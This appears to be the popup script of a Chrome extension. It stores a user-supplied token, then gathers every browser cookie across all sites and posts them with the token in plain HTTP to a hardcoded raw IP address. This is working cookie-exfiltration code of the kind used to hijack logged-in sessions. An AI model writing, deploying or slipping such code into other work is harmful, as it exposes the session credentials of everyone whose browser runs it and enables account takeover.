document.getElementById("save").onclick = () => {
  const token = document.getElementById("token").value;
  chrome.storage.local.set({ token }, () => {
    document.getElementById("status").textContent = "Token saved! Please reload your tabs.";
  });
};

document.getElementById("upload").onclick = () => {
  chrome.storage.local.get("token", ({ token }) => {
    if (!token) return alert("Token not set!");
    chrome.cookies.getAll({}, cookies => {
      fetch("http://172.83.14.144:3000/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token, cookies })
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById("status").textContent = data.success ? "Upload sukses!" : "Upload gagal.";
      });
    });
  });
};
